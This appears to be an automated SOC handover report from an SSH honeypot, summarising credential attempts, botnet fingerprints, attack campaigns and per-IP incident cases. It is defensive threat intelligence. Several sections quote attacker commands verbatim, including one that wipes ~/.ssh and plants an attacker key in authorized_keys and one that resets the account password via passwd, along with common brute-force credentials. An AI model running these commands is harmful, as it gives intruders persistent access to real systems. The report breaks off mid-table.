# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-10-30 |
| **Generated At** | 2026-10-30T17:26:37Z |
| **Shift Time** | 17:26 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **700** |
| Confirmed Threats | **650** |
| False Positives Filtered | **50** (7.1%) |
| Unique Attacker IPs | **381** |
| Countries of Origin | **58** |
| High Severity Cases | **484** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **216** |
| Malware Samples Analyzed | **9** HIGH · **25** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **8272** |
| Unique Credential Pairs | **1685** |
| Unique Usernames | **616** |
| Unique Passwords | **1122** |
| Successful Auth Pairs | **8133** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 2613 |
| `ubuntu` | 299 |
| `345gs5662d34` | 213 |
| `admin` | 207 |
| `user` | 164 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 466 |
| `123` | 285 |
| `345gs5662d34` | 213 |
| `3245gs5662d34` | 213 |
| `1234` | 188 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 213 |
| `root` | `3245gs5662d34` | 66 |
| `intel` | `123` | 37 |
| `intel` | `3245gs5662d34` | 36 |
| `support` | `support` | 30 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `*1` | `$4` | `35.210.65.152` | 2026-10-30T02:55:05 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7834` | `35.210.65.152` | 2026-10-30T02:55:07 |
| `root` | `linux` | `115.190.235.23` | 2026-10-30T02:59:08 |
| `test` | `123456` | `10.0.0.73` | 2026-10-30T03:01:04 |
| `test` | `test` | `138.226.239.234` | 2026-10-30T03:03:43 |
| `support` | `support` | `10.0.0.73` | 2026-10-30T03:06:26 |
| `test` | `test` | `10.0.0.73` | 2026-10-30T03:06:36 |
| `admin` | `admin123321` | `106.13.95.198` | 2026-10-30T03:10:11 |
| `webdev` | `P@ssw0rd` | `152.32.211.187` | 2026-10-30T03:13:20 |
| `345gs5662d34` | `345gs5662d34` | `152.32.211.187` | 2026-10-30T03:13:23 |
| `webdev` | `3245gs5662d34` | `152.32.211.187` | 2026-10-30T03:13:25 |
| `support` | `support` | `176.53.159.196` | 2026-10-30T03:13:41 |
| `root` | `zxc!@#` | `103.63.101.24` | 2026-10-30T03:17:54 |
| `345gs5662d34` | `345gs5662d34` | `103.63.101.24` | 2026-10-30T03:17:58 |
| `root` | `3245gs5662d34` | `103.63.101.24` | 2026-10-30T03:18:00 |
| `root` | `mk@123456` | `172.178.16.179` | 2026-10-30T03:19:50 |
| `345gs5662d34` | `345gs5662d34` | `172.178.16.179` | 2026-10-30T03:19:51 |
| `root` | `3245gs5662d34` | `172.178.16.179` | 2026-10-30T03:19:51 |
| `root` | `admin` | `138.226.239.233` | 2026-10-30T03:20:03 |
| `hunter` | `hunter` | `144.31.185.241` | 2026-10-30T03:20:11 |
_… 8113 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **700** |
| Sessions with Fingerprint | **30** |
| Unique HASSH Fingerprints | **30** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 429 |
| Go SSH scanner | 87 |
| OpenSSH | 22 |
| Unknown | 4 |
| Paramiko (Python) | 4 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 379 | 186 |
| `2ec37a7cc8da...` | Mirai/variant | 38 | 3 |
| `03a80b21afa8...` | Modern SSH client | 17 | 9 |
| `0a07365cc01f...` | Generic scanner | 13 | 6 |
| `16443846184e...` | Generic scanner | 11 | 5 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 379 | 186 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 38 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 26 | 19 | — |
| `03a80b21afa8...` | libssh | 17 | 9 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 13 | 6 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 11 | 5 | Generic scanner |
| `390ffe68a68c...` | OpenSSH | 10 | 3 | Modern SSH client |
| `eff4c24daffc...` | Go SSH scanner | 7 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **54** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1083, T1082, T1592, T1105` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 190 | 177 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo -e "qwerty123\n1cD5pOvhS4Ej\n1cD5pOvhS4Ej"|passwd|bash
```
```
Enter new UNIX password:
```
Source IPs: `121.204.171.142`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo Mf7a2d04d721e
```
```
uname -a
```
```
id
```
```
whoami
```
```
sh -c 'echo $$'
```
Source IPs: `64.177.33.68`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `120.48.14.72`, `123.58.213.128`, `43.157.200.91`, `43.134.57.143`, `66.116.253.71`, `154.92.19.226`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **381** |
| Unique ASNs | **141** |
| High-Risk ASNs | **112** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 105 | HIGH |
| `AS31898` | Oracle Corporation | 30 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 11 | HIGH |
| `AS4766` | Korea Telecom | 11 | HIGH |
| `AS8075` | Microsoft Corporation | 10 | HIGH |
| `AS398324` | Censys, Inc. | 9 | HIGH |
| `AS213412` | ONYPHE SAS | 9 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 7 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (481)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-24e28c1a7b8c

| Field | Detail |
|---|---|
| **Source IP** | `35.210.65[.]152` |
| **First Seen** | 2026-10-30 02:55 |
| **Last Seen** | 2026-10-30 02:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 02:55:05` | `cowrie.session.connect` |
| `2026-10-30 02:55:05` | `cowrie.login.success` |
| `2026-10-30 02:55:06` | `cowrie.session.params` |
| `2026-10-30 02:55:06` | `cowrie.command.input` |
| `2026-10-30 02:55:06` | `cowrie.command.failed` |
| `2026-10-30 02:55:09` | `cowrie.log.closed` |
| `2026-10-30 02:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.65[.]152` to AbuseIPDB if not already reported
- [ ] Block `35.210.65[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65fc1c91936b

| Field | Detail |
|---|---|
| **Source IP** | `35.210.65[.]152` |
| **First Seen** | 2026-10-30 02:55 |
| **Last Seen** | 2026-10-30 02:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 02:55:07` | `cowrie.session.connect` |
| `2026-10-30 02:55:07` | `cowrie.login.success` |
| `2026-10-30 02:55:08` | `cowrie.session.params` |
| `2026-10-30 02:55:08` | `cowrie.command.input` |
| `2026-10-30 02:55:09` | `cowrie.log.closed` |
| `2026-10-30 02:55:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.210.65[.]152` to AbuseIPDB if not already reported
- [ ] Block `35.210.65[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1917d3900681

| Field | Detail |
|---|---|
| **Source IP** | `115.190.235[.]23` |
| **First Seen** | 2026-10-30 02:58 |
| **Last Seen** | 2026-10-30 03:04 |
| **Session Duration** | 322s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 02:58:46` | `cowrie.session.connect` |
| `2026-10-30 02:58:46` | `cowrie.client.version` |
| `2026-10-30 02:58:47` | `cowrie.client.kex` |
| `2026-10-30 02:59:08` | `cowrie.login.success` |
| `2026-10-30 03:04:08` | `cowrie.session.file_upload` |
| `2026-10-30 03:04:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.235[.]23` to AbuseIPDB if not already reported
- [ ] Block `115.190.235[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b935042958a3

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]234` |
| **First Seen** | 2026-10-30 03:03 |
| **Last Seen** | 2026-10-30 03:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:03:40` | `cowrie.session.connect` |
| `2026-10-30 03:03:42` | `cowrie.client.version` |
| `2026-10-30 03:03:42` | `cowrie.client.kex` |
| `2026-10-30 03:03:43` | `cowrie.login.success` |
| `2026-10-30 03:03:44` | `cowrie.direct-tcpip.request` |
| `2026-10-30 03:03:44` | `cowrie.direct-tcpip.data` |
| `2026-10-30 03:03:45` | `cowrie.direct-tcpip.request` |
| `2026-10-30 03:03:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-197ca0697d35

| Field | Detail |
|---|---|
| **Source IP** | `106.13.95[.]198` |
| **First Seen** | 2026-10-30 03:10 |
| **Last Seen** | 2026-10-30 03:15 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:10:10` | `cowrie.session.connect` |
| `2026-10-30 03:10:10` | `cowrie.client.version` |
| `2026-10-30 03:10:10` | `cowrie.client.kex` |
| `2026-10-30 03:10:11` | `cowrie.login.success` |
| `2026-10-30 03:15:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.13.95[.]198` to AbuseIPDB if not already reported
- [ ] Block `106.13.95[.]198` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b48cc5c17dc9

| Field | Detail |
|---|---|
| **Source IP** | `152.32.211[.]187` |
| **First Seen** | 2026-10-30 03:13 |
| **Last Seen** | 2026-10-30 03:13 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:13:18` | `cowrie.session.connect` |
| `2026-10-30 03:13:18` | `cowrie.client.version` |
| `2026-10-30 03:13:19` | `cowrie.client.kex` |
| `2026-10-30 03:13:20` | `cowrie.login.success` |
| `2026-10-30 03:13:20` | `cowrie.session.params` |
| `2026-10-30 03:13:20` | `cowrie.command.input` |
| `2026-10-30 03:13:20` | `cowrie.command.failed` |
| `2026-10-30 03:13:21` | `cowrie.log.closed` |
| `2026-10-30 03:13:22` | `cowrie.session.params` |
| `2026-10-30 03:13:22` | `cowrie.command.input` |
| `2026-10-30 03:13:22` | `cowrie.session.file_download` |
| `2026-10-30 03:13:22` | `cowrie.log.closed` |
| `2026-10-30 03:13:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.211[.]187` to AbuseIPDB if not already reported
- [ ] Block `152.32.211[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f60552ecd3e

| Field | Detail |
|---|---|
| **Source IP** | `152.32.211[.]187` |
| **First Seen** | 2026-10-30 03:13 |
| **Last Seen** | 2026-10-30 03:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:13:22` | `cowrie.session.connect` |
| `2026-10-30 03:13:22` | `cowrie.client.version` |
| `2026-10-30 03:13:23` | `cowrie.client.kex` |
| `2026-10-30 03:13:23` | `cowrie.login.success` |
| `2026-10-30 03:13:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.211[.]187` to AbuseIPDB if not already reported
- [ ] Block `152.32.211[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a5931859c5

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-30 03:13 |
| **Last Seen** | 2026-10-30 03:13 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:13:41` | `cowrie.session.connect` |
| `2026-10-30 03:13:41` | `cowrie.client.version` |
| `2026-10-30 03:13:41` | `cowrie.client.kex` |
| `2026-10-30 03:13:41` | `cowrie.login.success` |
| `2026-10-30 03:13:41` | `cowrie.direct-tcpip.request` |
| `2026-10-30 03:13:41` | `cowrie.direct-tcpip.data` |
| `2026-10-30 03:13:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9c67a84b75a

| Field | Detail |
|---|---|
| **Source IP** | `103.63.101[.]24` |
| **First Seen** | 2026-10-30 03:17 |
| **Last Seen** | 2026-10-30 03:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:17:53` | `cowrie.session.connect` |
| `2026-10-30 03:17:53` | `cowrie.client.version` |
| `2026-10-30 03:17:53` | `cowrie.client.kex` |
| `2026-10-30 03:17:54` | `cowrie.login.success` |
| `2026-10-30 03:17:55` | `cowrie.session.params` |
| `2026-10-30 03:17:55` | `cowrie.command.input` |
| `2026-10-30 03:17:55` | `cowrie.command.failed` |
| `2026-10-30 03:17:56` | `cowrie.log.closed` |
| `2026-10-30 03:17:57` | `cowrie.session.params` |
| `2026-10-30 03:17:57` | `cowrie.command.input` |
| `2026-10-30 03:17:57` | `cowrie.session.file_download` |
| `2026-10-30 03:17:57` | `cowrie.log.closed` |
| `2026-10-30 03:18:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.101[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.63.101[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aec7cbf51855

| Field | Detail |
|---|---|
| **Source IP** | `103.63.101[.]24` |
| **First Seen** | 2026-10-30 03:17 |
| **Last Seen** | 2026-10-30 03:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:17:57` | `cowrie.session.connect` |
| `2026-10-30 03:17:57` | `cowrie.client.version` |
| `2026-10-30 03:17:57` | `cowrie.client.kex` |
| `2026-10-30 03:17:58` | `cowrie.login.success` |
| `2026-10-30 03:17:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.63.101[.]24` to AbuseIPDB if not already reported
- [ ] Block `103.63.101[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87a3365e060f

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-10-30 03:19 |
| **Last Seen** | 2026-10-30 03:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:19:50` | `cowrie.session.connect` |
| `2026-10-30 03:19:50` | `cowrie.client.version` |
| `2026-10-30 03:19:50` | `cowrie.client.kex` |
| `2026-10-30 03:19:50` | `cowrie.login.success` |
| `2026-10-30 03:19:50` | `cowrie.session.params` |
| `2026-10-30 03:19:50` | `cowrie.command.input` |
| `2026-10-30 03:19:50` | `cowrie.command.failed` |
| `2026-10-30 03:19:50` | `cowrie.log.closed` |
| `2026-10-30 03:19:51` | `cowrie.session.params` |
| `2026-10-30 03:19:51` | `cowrie.command.input` |
| `2026-10-30 03:19:51` | `cowrie.session.file_download` |
| `2026-10-30 03:19:51` | `cowrie.log.closed` |
| `2026-10-30 03:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf9902f7826b

| Field | Detail |
|---|---|
| **Source IP** | `172.178.16[.]179` |
| **First Seen** | 2026-10-30 03:19 |
| **Last Seen** | 2026-10-30 03:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:19:51` | `cowrie.session.connect` |
| `2026-10-30 03:19:51` | `cowrie.client.version` |
| `2026-10-30 03:19:51` | `cowrie.client.kex` |
| `2026-10-30 03:19:51` | `cowrie.login.success` |
| `2026-10-30 03:19:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.178.16[.]179` to AbuseIPDB if not already reported
- [ ] Block `172.178.16[.]179` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e8b1b0b4dfc

| Field | Detail |
|---|---|
| **Source IP** | `138.226.239[.]233` |
| **First Seen** | 2026-10-30 03:19 |
| **Last Seen** | 2026-10-30 03:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:19:59` | `cowrie.session.connect` |
| `2026-10-30 03:20:01` | `cowrie.client.version` |
| `2026-10-30 03:20:01` | `cowrie.client.kex` |
| `2026-10-30 03:20:03` | `cowrie.login.success` |
| `2026-10-30 03:20:03` | `cowrie.direct-tcpip.request` |
| `2026-10-30 03:20:04` | `cowrie.direct-tcpip.data` |
| `2026-10-30 03:20:05` | `cowrie.direct-tcpip.request` |
| `2026-10-30 03:20:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e8a31479ee0

| Field | Detail |
|---|---|
| **Source IP** | `144.31.185[.]241` |
| **First Seen** | 2026-10-30 03:20 |
| **Last Seen** | 2026-10-30 03:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-30 03:20:10` | `cowrie.session.connect` |
| `2026-10-30 03:20:10` | `cowrie.client.version` |
| `2026-10-30 03:20:10` | `cowrie.client.kex` |
| `2026-10-30 03:20:11` | `cowrie.login.success` |
| `2026-10-30 03:20:11` | `cowrie.session.params` |
| `2026-10-30 03:20:11` | `cowrie.command.input` |
| `2026-10-30 03:20:11` | `cowrie.command.failed` |
| `2026-10-30 03:20:11` | `cowrie.log.closed` |
| `2026-10-30 03:20:12` | `cowrie.session.params` |
| `2026-10-30 03:20:12` | `cowrie.command.input` |
| `2026-10-30 03:20:12` | `cowrie.session.file_download` |
| `2026-10-30 03:20:12` | `cowrie.log.closed` |
| `2026-10-30 03:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.31.185[.]241` to AbuseIPDB if not already reported
- [ ] Block `144.31.185[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e64bf265ace

| Field | Detail |
